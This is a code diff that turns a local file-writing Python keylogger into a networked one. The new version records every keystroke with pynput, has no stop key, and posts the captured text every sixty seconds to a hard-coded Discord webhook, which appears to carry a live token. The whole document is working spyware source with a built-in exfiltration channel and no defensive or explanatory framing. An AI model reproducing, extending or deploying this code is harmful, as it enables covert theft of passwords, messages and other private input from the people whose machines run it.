@@ -1,26 +1,38 @@
-from pynput import keyboard
-import os
-from datetime import datetime
+import threading
+import pynput.keyboard
+import requests
 
-log_dir = "C:\\Users\\Public\\Logs"
-if not os.path.exists(log_dir):
-    os.makedirs(log_dir)
+log = ""
+webhook_url = "https://discord.com/api/webhooks/1328769869260525568/TdEkWxoQwBXR-DkbreHln5Uhy45Wn9Ys0Ay27q5vQGtmKhrKUwqCqnYX3M7qsNl8UxUN"
 
-log_file = os.path.join(log_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
-
-def write_to_file(text):
-    with open(log_file, "a") as f:
-        f.write(text + "\n")
-
-def on_press(key):
+def callback_function(key):
+    global log
     try:
-        write_to_file(f"{key.char}")
+        log += str(key.char)
     except AttributeError:
-        write_to_file(f"[{key}]")
+        if key == key.space:
+            log += " "
+        else:
+            log += f" {str(key)} "
 
-def on_release(key):
-    if key == keyboard.Key.esc:
-        return False
+def send_log_to_discord():
+    global log
+    global webhook_url
+    if log:
+        payload = {
+            "content": log
+        }
+        try:
+            requests.post(webhook_url, json=payload)
+        except Exception as e:
+            print("Sending error:", e)
+        log = ""
+    timer = threading.Timer(60, send_log_to_discord)
+    timer.start()
 
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+send_log_to_discord()
+
+keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
+
+with keylogger_listener:
+    keylogger_listener.join()
